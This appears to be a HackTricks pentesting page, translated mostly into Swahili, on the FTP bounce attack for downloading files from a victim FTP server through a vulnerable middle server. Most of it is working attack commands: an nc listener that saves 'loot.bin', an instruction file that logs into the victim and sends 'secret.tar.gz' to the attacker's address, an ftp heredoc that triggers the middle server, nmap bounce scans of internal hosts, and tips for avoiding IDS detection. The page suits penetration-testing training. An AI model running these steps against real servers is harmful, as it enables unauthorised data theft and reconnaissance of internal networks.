# FTP Bounce Kupakua 2 ya FTP File

{{#include ../../banners/hacktricks-training.md}}


## Muhtasari

Ikiwa una ufikiaji wa **bounce FTP server**, unaweza kuifanya iombe faili za **another FTP server** (ambapo unajua baadhi ya credentials) na kupakua faili hiyo kwenye **server yako mwenyewe**.

## Mahitaji

- FTP valid credentials in the **FTP Middle server**
- FTP valid credentials in **Victim FTP server**
- Both servers **accept the `PORT` command** (bounce FTP attack)
- Unaweza **kuandika** ndani ya saraka fulani ya **FTP Middle server**
- The middle server ina **access zaidi** ndani ya Victim FTP Server kuliko wewe

## Hatua

1. Ungana na **your own FTP server** na fanya muunganisho kuwa passive (`pasv` command) ili iweze **kusikiliza** katika saraka ambapo service ya victim itatuma faili.
2. Tengeneza faili ambayo **FTP Middle server** itapeleka kwa Victim server (the **exploit script**). Faili hii itakuwa plain text yenye amri zinazohitajika kuhalalisha dhidi ya Victim server, kubadilisha directory na kupakua faili kwenye server yako mwenyewe.
3. Ungana na **FTP Middle Server** na upload faili uliotengenezwa hapo juu.
4. Fanya **FTP Middle server** ianzishe muunganisho na Victim server na itume exploit file.
5. **Pokea** faili kwenye your own FTP server.
6. **Futa** exploit file kutoka kwa FTP Middle server.

## Ukaguzi wa haraka kwa bounce hosts zilizo hatarini

- **Nmap** bado inaunga mkono ukaguzi wa FTP bounce. Mfano kuthibitisha potential middle server:
```bash
nmap -Pn -p21 --script ftp-bounce <middle_ftp_ip>
# or directly attempt a bounce scan
nmap -Pn -p80 -b user:pass@<middle_ftp_ip>:21 <internal_target_ip>
```
If the server refuses third‑party `PORT` values the scan will fail; some **vichapishi vya zamani/vyenye kujengwa ndani, NAS na daemon za FTP za appliance** bado zinaruhusu.

## Kuendesha kiotomatiki upakuaji wa pili wa FTP

Hapa chini ni njia ya kisasa ya kuvuta faili kupitia server ya kati ya FTP iliyo hatarini.

1. **Fungua msikilizaji pasivu** kwenye mashine yako ya shambulio (sink yoyote ya TCP inafaa):
```bash
nc -lvnp 2121 > loot.bin  # or run a small pyftpdlib server
```

2. **Tambua** IP yako kama `A,B,C,D` na port `P` kama `p1,p2` (`p1 = P/256`, `p2 = P%256`).

3. **Tengeneza faili la maagizo** ambalo server ya kati itarejesha kwa korban:
```bash
cat > instrs <<'EOF'
USER <victim_user>
PASS <victim_pass>
CWD /path/inside/victim
TYPE I
PORT A,B,C,D,p1,p2
RETR secret.tar.gz
QUIT
EOF
# Add padding so the control channel stays open on picky daemons
dd if=/dev/zero bs=1024 count=60 >> instrs
```

4. **Pakia & chochea kutoka server ya kati** (classic proxy FTP):
```bash
ftp -n <middle_ftp> <<'EOF'
user <middle_user> <middle_pass>
put instrs
PORT <victim_ip_with_commas>,0,21
RETR instrs
QUIT
EOF
```

5. **Pata faili** kutoka kwa msikilizaji wako (`loot.bin`).
6. **Safisha** faili iliyopakiwa `instrs` kwenye server ya kati.

Notes:
- Padding (`dd ...`) inazuia muunganisho wa udhibiti kufungwa kabla ya RETR kumalizika (tatizo la dirisha kubwa la TCP linalojadiliwa katika maandishi ya zamani).
- Huduma yoyote inayoweza **kusikiliza na kumwaga TCP** inaweza kubadilisha socket ya FTP PASV (mfano, `socat -u TCP-LISTEN:2121,fork - > loot.bin`).
- Ikiwa server ya kati inadhibiti bandari zenye hadhi, tumia bandari ya juu katika `PORT` na rekebisha msikilizaji wako ipasavyo.

## Mbinu za ziada

- Tumia server ya FTP inayoweza ku-bounce kufanya **port-scan internal hosts** wakati kuhamisha faili kumeremwa:
```bash
nmap -Pn -p22,80,445 -b anonymous:<email>@<middle_ftp> <internal_ip>
```
- Baadhi ya WAF/IDS za kisasa (mfano, Juniper IPS) zina saini maalum kwa **FTP:EXPLOIT:BOUNCE-ATTACK**; payload zenye kelele au kukosa padding zinaweza kusababisha kuzitambua.
- Wakati server ya kati inatekeleza vikwazo vya "PORT to same host", weka **msikilizaji wako kwenye server ya kati mwenyewe** (ikiwa una uwezo wa kuandika/kuendesha) na peleka faili iliyopatikana baadaye.

Kwa mwendo wa kina wa mtindo wa zamani angalia: [http://www.ouah.org/ftpbounce.html](http://www.ouah.org/ftpbounce.html)




## References

- [Nmap book – TCP FTP Bounce Scan (-b)](https://nmap.org/book/scan-methods-ftp-bounce-scan.html)
- [CPTS Attacking Common Services – FTP Bounce example (2025)](https://www.chaostudy.com/2025/02/24/cpts-attacking-common-services/)
{{#include ../../banners/hacktricks-training.md}}
